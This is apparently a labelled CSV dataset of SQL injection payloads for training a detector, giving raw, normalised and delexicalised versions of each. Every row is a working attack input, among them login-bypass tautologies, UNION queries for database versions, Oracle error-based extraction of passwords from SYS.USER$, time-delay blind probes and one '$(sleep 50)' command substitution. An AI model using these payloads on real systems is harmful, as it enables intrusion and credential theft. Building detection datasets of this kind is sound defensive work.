payload_raw,label,source,sqli_type_hint,is_obfuscated,payload_norm,payload_delex
? or 1  =  1 --,1,sqli_dataset.csv,,False,? or 1 = 1 --,? or <NUM> = <NUM> --
 )   or   (  'a'  =  'a,1,sqli_dataset.csv,,False,) or ( 'a' = 'a,) or ( <STR> = 'a
admin' or 1  =  1#,1,sqli_dataset.csv,,False,admin' or 1 = 1#,<TABLE>' or <NUM> = <NUM>#
" select * from users where id  =  1 or ""  (  ]"" or 1  =  1 -- 1",1,sqli_dataset.csv,,False,"select * from users where id = 1 or "" ( ]"" or 1 = 1 -- 1",select * from <TABLE> where <COL> = <NUM> or <STR> or <NUM> = <NUM> -- <NUM>
or 1  =  1 --,1,sqli_dataset.csv,,False,or 1 = 1 --,or <NUM> = <NUM> --
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",1,sqli_dataset.csv,,False,"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( column_name ) FROM ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns ) WHERE LIMIT = 5 ) ) AND 'i' = 'i","AND <NUM> = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( column_name ) FROM ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns ) WHERE LIMIT = <NUM> ) ) AND <STR> = 'i"
" select * from users where id  =  '1' %!<@ union select 1,version  (    )   -- 1'",1,sqli_dataset.csv,,False,"select * from users where id = '1' %!<@ union select 1,version ( ) -- 1'","select * from <TABLE> where <COL> = <STR> %!<@ union select <NUM>,version ( ) -- <NUM>'"
" select * from users where id  =  1 or ""&  (  "" or 1  =  1 -- 1",1,sqli_dataset.csv,,False,"select * from users where id = 1 or ""& ( "" or 1 = 1 -- 1",select * from <TABLE> where <COL> = <NUM> or <STR> or <NUM> = <NUM> -- <NUM>
" select * from users where id  =  1 or ""?  (  "" or 1  =  1 -- 1",1,sqli_dataset.csv,,False,"select * from users where id = 1 or ""? ( "" or 1 = 1 -- 1",select * from <TABLE> where <COL> = <NUM> or <STR> or <NUM> = <NUM> -- <NUM>
distinct,1,sqli_dataset.csv,,False,distinct,distinct
select * from users where id  =  '1' *  (  \  )   or 1  =  1 -- 1',1,sqli_dataset.csv,,False,select * from users where id = '1' * ( \ ) or 1 = 1 -- 1',select * from <TABLE> where <COL> = <STR> * ( \ ) or <NUM> = <NUM> -- <NUM>'
"1 and ascii  (  lower  (  substring   (    (   select top 1 name from sysobjects where xtype  =  'u'  )  , 1, 1   )    )     )   > 116",1,sqli_dataset.csv,,False,"1 and ascii ( lower ( substring ( ( select top 1 name from sysobjects where xtype = 'u' ) , 1, 1 ) ) ) > 116","<NUM> and ascii ( lower ( substring ( ( select top <NUM> <COL> from sysobjects where xtype = <STR> ) , <NUM>, <NUM> ) ) ) > <NUM>"
select * from users where id  =  1 or \.<\ or 1  =  1 -- 1,1,sqli_dataset.csv,,False,select * from users where id = 1 or \.<\ or 1 = 1 -- 1,select * from <TABLE> where <COL> = <NUM> or \.<\ or <NUM> = <NUM> -- <NUM>
"admin"" or ""1""  =  ""1""--",1,sqli_dataset.csv,,False,"admin"" or ""1"" = ""1""--","<TABLE><STR><NUM><STR><NUM>""--"
" select * from users where id  =  1 or ""%{"" or 1  =  1 -- 1",1,sqli_dataset.csv,,False,"select * from users where id = 1 or ""%{"" or 1 = 1 -- 1",select * from <TABLE> where <COL> = <NUM> or <STR> or <NUM> = <NUM> -- <NUM>
insert,1,sqli_dataset.csv,,False,insert,insert
" select * from users where id  =  1 or 1#""?  =  1 or 1  =  1 -- 1",1,sqli_dataset.csv,,False,"select * from users where id = 1 or 1#""? = 1 or 1 = 1 -- 1","select * from <TABLE> where <COL> = <NUM> or <NUM>#""? = <NUM> or <NUM> = <NUM> -- <NUM>"
" select * from users where id  =  1 or ""%?"" or 1  =  1 -- 1",1,sqli_dataset.csv,,False,"select * from users where id = 1 or ""%?"" or 1 = 1 -- 1",select * from <TABLE> where <COL> = <NUM> or <STR> or <NUM> = <NUM> -- <NUM>
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  8   )    )    AND 'i'  =  'i",1,sqli_dataset.csv,,False,"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( PASSWORD ) FROM ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ ) WHERE LIMIT = 8 ) ) AND 'i' = 'i","AND <NUM> = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( <COL> ) FROM ( SELECT DISTINCT ( <COL> ) , ROWNUM AS LIMIT FROM SYS.USER$ ) WHERE LIMIT = <NUM> ) ) AND <STR> = 'i"
" select * from users where id  =  1 or ""?#"" or 1  =  1 -- 1",1,sqli_dataset.csv,,False,"select * from users where id = 1 or ""?#"" or 1 = 1 -- 1",select * from <TABLE> where <COL> = <NUM> or <STR> or <NUM> = <NUM> -- <NUM>
"or 1  =  1 or """"  =  ",1,sqli_dataset.csv,,False,"or 1 = 1 or """" =",or <NUM> = <NUM> or <STR> =
/**/or/**/1/**/  =  /**/1,1,sqli_dataset.csv,,True,or 1 = 1,or <NUM> = <NUM>
" select * from users where id  =  1 or "".  (  "" or 1  =  1 -- 1",1,sqli_dataset.csv,,False,"select * from users where id = 1 or "". ( "" or 1 = 1 -- 1",select * from <TABLE> where <COL> = <NUM> or <STR> or <NUM> = <NUM> -- <NUM>
" select * from users where id  =  '1' union select ||/1,version  (    )   -- 1'",1,sqli_dataset.csv,,False,"select * from users where id = '1' union select ||/1,version ( ) -- 1'","select * from <TABLE> where <COL> = <STR> union select ||/<NUM>,version ( ) -- <NUM>'"
" select * from users where id  =  '1' union select +\.,@@VERSION -- 1'",1,sqli_dataset.csv,,True,"select * from users where id = '1' union select +\.,@@VERSION -- 1'","select * from <TABLE> where <COL> = <STR> union select +\.,@@VERSION -- <NUM>'"
or 1  =  1/*,1,sqli_dataset.csv,,False,or 1 = 1/*,or <NUM> = <NUM>/*
%27 or 1  =  1,1,sqli_dataset.csv,,True,' or 1 = 1,' or <NUM> = <NUM>
" select * from users where id  =  1 <@&@ union select 1,version  (    )   -- 1",1,sqli_dataset.csv,,False,"select * from users where id = 1 <@&@ union select 1,version ( ) -- 1","select * from <TABLE> where <COL> = <NUM> <@&@ union select <NUM>,version ( ) -- <NUM>"
" select * from users where id  =  '1' union select $*$,@@VERSION -- 1'",1,sqli_dataset.csv,,False,"select * from users where id = '1' union select $*$,@@VERSION -- 1'","select * from <TABLE> where <COL> = <STR> union select $*$,@@VERSION -- <NUM>'"
"1;  (  load_file  (  char  (  47,101,116,99,47,112,97,115, ...",1,sqli_dataset.csv,,False,"1; ( load_file ( char ( 47,101,116,99,47,112,97,115, ...","<NUM>; ( load_file ( char ( <NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>, ..."
" select * from users where id  =  '1' or $ 1  =  1 union select 1,@@VERSION -- 1'",1,sqli_dataset.csv,,False,"select * from users where id = '1' or $ 1 = 1 union select 1,@@VERSION -- 1'","select * from <TABLE> where <COL> = <STR> or $ <NUM> = <NUM> union select <NUM>,@@VERSION -- <NUM>'"
select * from users where id  =  1 or \.<1 or 1  =  1 -- 1,1,sqli_dataset.csv,,False,select * from users where id = 1 or \.<1 or 1 = 1 -- 1,select * from <TABLE> where <COL> = <NUM> or \.<<NUM> or <NUM> = <NUM> -- <NUM>
" select * from users where id  =  '1' or \<\ union select 1,@@VERSION -- 1'",1,sqli_dataset.csv,,False,"select * from users where id = '1' or \<\ union select 1,@@VERSION -- 1'","select * from <TABLE> where <COL> = <STR> or \<\ union select <NUM>,@@VERSION -- <NUM>'"
" select * from users where id  =  1 union select 1||1,version  (    )   -- 1",1,sqli_dataset.csv,,False,"select * from users where id = 1 union select 1||1,version ( ) -- 1","select * from <TABLE> where <COL> = <NUM> union select <NUM>||<NUM>,version ( ) -- <NUM>"
" select * from users where id  =  1 ||1 union select null,banner from v$version where rownum  =  1 -- 1",1,sqli_dataset.csv,,False,"select * from users where id = 1 ||1 union select null,banner from v$version where rownum = 1 -- 1","select * from <TABLE> where <COL> = <NUM> ||<NUM> union select null,banner from v$version where rownum = <NUM> -- <NUM>"
select * from users where id  =  '1' or \.<\ or 1  =  1 -- 1',1,sqli_dataset.csv,,False,select * from users where id = '1' or \.<\ or 1 = 1 -- 1',select * from <TABLE> where <COL> = <STR> or \.<\ or <NUM> = <NUM> -- <NUM>'
" select * from users where id  =  1 or ""]{"" or 1  =  1 -- 1",1,sqli_dataset.csv,,False,"select * from users where id = 1 or ""]{"" or 1 = 1 -- 1",select * from <TABLE> where <COL> = <NUM> or <STR> or <NUM> = <NUM> -- <NUM>
" select * from users where id  =  1 or "".@"" or 1  =  1 -- 1",1,sqli_dataset.csv,,False,"select * from users where id = 1 or "".@"" or 1 = 1 -- 1",select * from <TABLE> where <COL> = <NUM> or <STR> or <NUM> = <NUM> -- <NUM>
" select * from users where id  =  1 or ""$["" or 1  =  1 -- 1",1,sqli_dataset.csv,,False,"select * from users where id = 1 or ""$["" or 1 = 1 -- 1",select * from <TABLE> where <COL> = <NUM> or <STR> or <NUM> = <NUM> -- <NUM>
or 1 --',1,sqli_dataset.csv,,False,or 1 --',or <NUM> --'
" select * from users where id  =  1 or "",;"" or 1  =  1 -- 1",1,sqli_dataset.csv,,False,"select * from users where id = 1 or "",;"" or 1 = 1 -- 1",select * from <TABLE> where <COL> = <NUM> or <STR> or <NUM> = <NUM> -- <NUM>
"admin"" or 1  =  1#",1,sqli_dataset.csv,,False,"admin"" or 1 = 1#","<TABLE>"" or <NUM> = <NUM>#"
" select * from users where id  =  1 +  (  1  )   union select null,banner from v$version where rownum  =  1 -- 1",1,sqli_dataset.csv,,True,"select * from users where id = 1 + ( 1 ) union select null,banner from v$version where rownum = 1 -- 1","select * from <TABLE> where <COL> = <NUM> + ( <NUM> ) union select null,banner from v$version where rownum = <NUM> -- <NUM>"
\x27UNION SELECT,1,sqli_dataset.csv,,False,\x27UNION SELECT,\x27UNION SELECT
PRINT,1,sqli_dataset.csv,,False,PRINT,PRINT
" select * from users where id  =  '1' union select   (  \.  )  ,@@VERSION -- 1'",1,sqli_dataset.csv,,False,"select * from users where id = '1' union select ( \. ) ,@@VERSION -- 1'","select * from <TABLE> where <COL> = <STR> union select ( \. ) ,@@VERSION -- <NUM>'"
or 1  =  1--,1,sqli_dataset.csv,,False,or 1 = 1--,or <NUM> = <NUM>--
1 or pg_sleep  (  __TIME__  )  --,1,sqli_dataset.csv,,False,1 or pg_sleep ( __TIME__ ) --,<NUM> or pg_sleep ( __TIME__ ) --
" select * from users where id  =  1 or "",#"" or 1  =  1 -- 1",1,sqli_dataset.csv,,False,"select * from users where id = 1 or "",#"" or 1 = 1 -- 1",select * from <TABLE> where <COL> = <NUM> or <STR> or <NUM> = <NUM> -- <NUM>
admin'  )   or   (  '1'  =  '1'/*,1,sqli_dataset.csv,,False,admin' ) or ( '1' = '1'/*,<TABLE><STR><NUM><STR><NUM>'/*
or 2 between 1 and 3,1,sqli_dataset.csv,,False,or 2 between 1 and 3,or <NUM> between <NUM> and <NUM>
" select * from users where id  =  1 or ""  )  .""  =  1 or 1  =  1 -- 1",1,sqli_dataset.csv,,False,"select * from users where id = 1 or "" ) ."" = 1 or 1 = 1 -- 1",select * from <TABLE> where <COL> = <NUM> or <STR> = <NUM> or <NUM> = <NUM> -- <NUM>
" select * from users where id  =  1 or 1#"". union select null,version  (    )   -- 1",1,sqli_dataset.csv,,False,"select * from users where id = 1 or 1#"". union select null,version ( ) -- 1","select * from <TABLE> where <COL> = <NUM> or <NUM>#"". union select null,version ( ) -- <NUM>"
admin' or '1'  =  '1,1,sqli_dataset.csv,,False,admin' or '1' = '1,<TABLE><STR><NUM><STR><NUM>
; if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --,1,sqli_dataset.csv,,False,; if not ( select system_user ) <> 'sa' waitfor delay '0:0:2' --,; if not ( select system_user ) <> <STR> waitfor delay <STR> --
" select * from users where id  =  1 union select 1,banner from v$version where rownum  =  1 -- 1",1,sqli_dataset.csv,,False,"select * from users where id = 1 union select 1,banner from v$version where rownum = 1 -- 1","select * from <TABLE> where <COL> = <NUM> union select <NUM>,banner from v$version where rownum = <NUM> -- <NUM>"
""" or 0  =  0 --",1,sqli_dataset.csv,,False,""" or 0 = 0 --",""" or <NUM> = <NUM> --"
" select * from users where id  =  1 union select @ $_,version  (    )   -- 1",1,sqli_dataset.csv,,False,"select * from users where id = 1 union select @ $_,version ( ) -- 1","select * from <TABLE> where <COL> = <NUM> union select @ $_,version ( ) -- <NUM>"
select * from users where id  =  1 <@.$ or 1  =  1 -- 1,1,sqli_dataset.csv,,False,select * from users where id = 1 <@.$ or 1 = 1 -- 1,select * from <TABLE> where <COL> = <NUM> <@.$ or <NUM> = <NUM> -- <NUM>
" select * from users where id  =  1 or ""%."" or 1  =  1 -- 1",1,sqli_dataset.csv,,False,"select * from users where id = 1 or ""%."" or 1 = 1 -- 1",select * from <TABLE> where <COL> = <NUM> or <STR> or <NUM> = <NUM> -- <NUM>
" select * from users where id  =  1 + $+*$ union select null,@@VERSION -- 1",1,sqli_dataset.csv,,True,"select * from users where id = 1 + $+*$ union select null,@@VERSION -- 1","select * from <TABLE> where <COL> = <NUM> + $+*$ union select null,@@VERSION -- <NUM>"
" select * from users where id  =  1 or "",."" or 1  =  1 -- 1",1,sqli_dataset.csv,,False,"select * from users where id = 1 or "",."" or 1 = 1 -- 1",select * from <TABLE> where <COL> = <NUM> or <STR> or <NUM> = <NUM> -- <NUM>
char%4039%41%2b%40SELECT,1,sqli_dataset.csv,,True,char@39A+@SELECT,char@39A+@SELECT
" select * from users where id  =  1 or ""1&"" or 1  =  1 -- 1",1,sqli_dataset.csv,,False,"select * from users where id = 1 or ""1&"" or 1 = 1 -- 1",select * from <TABLE> where <COL> = <NUM> or <STR> or <NUM> = <NUM> -- <NUM>
admin'  )   or   (  '1'  =  '1,1,sqli_dataset.csv,,False,admin' ) or ( '1' = '1,<TABLE><STR><NUM><STR><NUM>
declare @s varchar   (  200  )   select @s   =   0x73656c6 ...,1,sqli_dataset.csv,,True,declare @s varchar ( 200 ) select @s = 0x73656c6 ...,declare @s varchar ( <NUM> ) select @s = 0x73656c6 ...
"or 0  =  0 #""",1,sqli_dataset.csv,,False,"or 0 = 0 #""","or <NUM> = <NUM> #"""
" select * from users where id  =  1 or "".]"" or 1  =  1 -- 1",1,sqli_dataset.csv,,False,"select * from users where id = 1 or "".]"" or 1 = 1 -- 1",select * from <TABLE> where <COL> = <NUM> or <STR> or <NUM> = <NUM> -- <NUM>
  )   or   (  'x'  =  'x,1,sqli_dataset.csv,,False,) or ( 'x' = 'x,) or ( <STR> = 'x
" select * from users where id  =  1.<@$ union select 1,version  (    )   -- 1",1,sqli_dataset.csv,,False,"select * from users where id = 1.<@$ union select 1,version ( ) -- 1","select * from <TABLE> where <COL> = <NUM>.<@$ union select <NUM>,version ( ) -- <NUM>"
$  (  sleep 50  ) ,1,sqli_dataset.csv,,False,$ ( sleep 50 ),$ ( sleep <NUM> )
" select * from users where id  =  1 *1 union select null,banner from v$version where rownum  =  1 -- 1",1,sqli_dataset.csv,,False,"select * from users where id = 1 *1 union select null,banner from v$version where rownum = 1 -- 1","select * from <TABLE> where <COL> = <NUM> *<NUM> union select null,banner from v$version where rownum = <NUM> -- <NUM>"
"1 union all select 1,2,3,4,5,6,name from sysobjects where xtype   =   'u' --",1,sqli_dataset.csv,,False,"1 union all select 1,2,3,4,5,6,name from sysobjects where xtype = 'u' --","<NUM> union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<COL> from sysobjects where xtype = <STR> --"
" select * from users where id  =  1 or 1#"". union select 'a',version  (    )   -- 1",1,sqli_dataset.csv,,False,"select * from users where id = 1 or 1#"". union select 'a',version ( ) -- 1","select * from <TABLE> where <COL> = <NUM> or <NUM>#"". union select <STR>,version ( ) -- <NUM>"
" select * from users where id  =  1 or 1#""; union select null,version  (    )   -- 1",1,sqli_dataset.csv,,False,"select * from users where id = 1 or 1#""; union select null,version ( ) -- 1","select * from <TABLE> where <COL> = <NUM> or <NUM>#""; union select null,version ( ) -- <NUM>"
" select * from users where id  =  1 or 1#""? or 1  =  1 -- 1",1,sqli_dataset.csv,,False,"select * from users where id = 1 or 1#""? or 1 = 1 -- 1","select * from <TABLE> where <COL> = <NUM> or <NUM>#""? or <NUM> = <NUM> -- <NUM>"
"""a"""" or 1  =  1--""",1,sqli_dataset.csv,,False,"""a"""" or 1 = 1--""",<STR><STR>
" select * from users where id  =  1 *1 union select 1,banner from v$version where rownum  =  1 -- 1",1,sqli_dataset.csv,,False,"select * from users where id = 1 *1 union select 1,banner from v$version where rownum = 1 -- 1","select * from <TABLE> where <COL> = <NUM> *<NUM> union select <NUM>,banner from v$version where rownum = <NUM> -- <NUM>"
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  4   )    )    AND 'i'  =  'i",1,sqli_dataset.csv,,False,"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( column_name ) FROM ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns ) WHERE LIMIT = 4 ) ) AND 'i' = 'i","AND <NUM> = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( column_name ) FROM ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns ) WHERE LIMIT = <NUM> ) ) AND <STR> = 'i"
" select * from users where id  =  '1' union select   (  \  )  ,@@VERSION -- 1'",1,sqli_dataset.csv,,False,"select * from users where id = '1' union select ( \ ) ,@@VERSION -- 1'","select * from <TABLE> where <COL> = <STR> union select ( \ ) ,@@VERSION -- <NUM>'"
1 and user_name  (    )     =   'dbo',1,sqli_dataset.csv,,False,1 and user_name ( ) = 'dbo',<NUM> and user_name ( ) = <STR>
"; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --",1,sqli_dataset.csv,,False,"; if not ( substring ( ( select @@version ) ,24,1 ) <> 1 ) waitfor delay '0:0:2' --","; if not ( substring ( ( select @@version ) ,<NUM>,<NUM> ) <> <NUM> ) waitfor delay <STR> --"
" select * from users where id  =  1 or 1#""$ union select 1,version  (    )   -- 1",1,sqli_dataset.csv,,False,"select * from users where id = 1 or 1#""$ union select 1,version ( ) -- 1","select * from <TABLE> where <COL> = <NUM> or <NUM>#""$ union select <NUM>,version ( ) -- <NUM>"
" select * from users where id  =  1 or 1#""{ union select null,version  (    )   -- 1",1,sqli_dataset.csv,,False,"select * from users where id = 1 or 1#""{ union select null,version ( ) -- 1","select * from <TABLE> where <COL> = <NUM> or <NUM>#""{ union select null,version ( ) -- <NUM>"
select * from users where id  =  '1' *$ . or 1  =  1 -- 1',1,sqli_dataset.csv,,False,select * from users where id = '1' *$ . or 1 = 1 -- 1',select * from <TABLE> where <COL> = <STR> *$ . or <NUM> = <NUM> -- <NUM>'
select * from users where id  =  1 +$+. or 1  =  1 -- 1,1,sqli_dataset.csv,,True,select * from users where id = 1 +$+. or 1 = 1 -- 1,select * from <TABLE> where <COL> = <NUM> +$+. or <NUM> = <NUM> -- <NUM>
select * from users where id  =  1 or   (  \+  )    =  1 or 1  =  1 -- 1,1,sqli_dataset.csv,,True,select * from users where id = 1 or ( \+ ) = 1 or 1 = 1 -- 1,select * from <TABLE> where <COL> = <NUM> or ( \+ ) = <NUM> or <NUM> = <NUM> -- <NUM>
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",1,sqli_dataset.csv,,False,"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( USERNAME ) FROM ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS ) WHERE LIMIT = 6 ) ) AND 'i' = 'i","AND <NUM> = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( <COL> ) FROM ( SELECT DISTINCT ( <COL> ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS ) WHERE LIMIT = <NUM> ) ) AND <STR> = 'i"
or 1  =  1 or ''  =  ',1,sqli_dataset.csv,,False,or 1 = 1 or '' = ',or <NUM> = <NUM> or <STR> = '
select * from users where id  =  1   or 1  =  1 -- 1,1,sqli_dataset.csv,,False,select * from users where id = 1 or 1 = 1 -- 1,select * from <TABLE> where <COL> = <NUM> or <NUM> = <NUM> -- <NUM>
or 'text' > 't',1,sqli_dataset.csv,,False,or 'text' > 't',or <STR> > <STR>
"1234 "" AND 1  =  0 UNION ALL SELECT ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055",1,sqli_dataset.csv,,False,"1234 "" AND 1 = 0 UNION ALL SELECT ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055",<NUM> <STR><TABLE><STR>81dc9bdb52d04dc20036dbd8313ed055
" select * from users where id  =  1 or ""%["" or 1  =  1 -- 1",1,sqli_dataset.csv,,False,"select * from users where id = 1 or ""%["" or 1 = 1 -- 1",select * from <TABLE> where <COL> = <NUM> or <STR> or <NUM> = <NUM> -- <NUM>
" select * from users where id  =  1 or 1#"";  =  1 union select 1,version  (    )   -- 1",1,sqli_dataset.csv,,False,"select * from users where id = 1 or 1#""; = 1 union select 1,version ( ) -- 1","select * from <TABLE> where <COL> = <NUM> or <NUM>#""; = <NUM> union select <NUM>,version ( ) -- <NUM>"
admin' or '1'  =  '1'#,1,sqli_dataset.csv,,False,admin' or '1' = '1'#,<TABLE><STR><NUM><STR><NUM>'#
select * from users where id  =  1 +$ 1 or 1  =  1 -- 1,1,sqli_dataset.csv,,True,select * from users where id = 1 +$ 1 or 1 = 1 -- 1,select * from <TABLE> where <COL> = <NUM> +$ <NUM> or <NUM> = <NUM> -- <NUM>
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  4   )    )    AND 'i'  =  'i",1,sqli_dataset.csv,,False,"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( USERNAME ) FROM ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS ) WHERE LIMIT = 4 ) ) AND 'i' = 'i","AND <NUM> = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( <COL> ) FROM ( SELECT DISTINCT ( <COL> ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS ) WHERE LIMIT = <NUM> ) ) AND <STR> = 'i"
 select * from information_schema.tables--,1,sqli_dataset.csv,,False,select * from information_schema.tables--,select * from information_schema.tables--
" select * from users where id  =  1 or ""$&"" or 1  =  1 -- 1",1,sqli_dataset.csv,,False,"select * from users where id = 1 or ""$&"" or 1 = 1 -- 1",select * from <TABLE> where <COL> = <NUM> or <STR> or <NUM> = <NUM> -- <NUM>
1   )    )    or pg_sleep  (  __TIME__  )  --,1,sqli_dataset.csv,,False,1 ) ) or pg_sleep ( __TIME__ ) --,<NUM> ) ) or pg_sleep ( __TIME__ ) --
" select * from users where id  =  '1' union select !<@,version  (    )   -- 1'",1,sqli_dataset.csv,,False,"select * from users where id = '1' union select !<@,version ( ) -- 1'","select * from <TABLE> where <COL> = <STR> union select !<@,version ( ) -- <NUM>'"
declare @q nvarchar   (  200  )   select @q   =   0x770061 ...,1,sqli_dataset.csv,,True,declare @q nvarchar ( 200 ) select @q = 0x770061 ...,declare @q nvarchar ( <NUM> ) select @q = 0x770061 ...
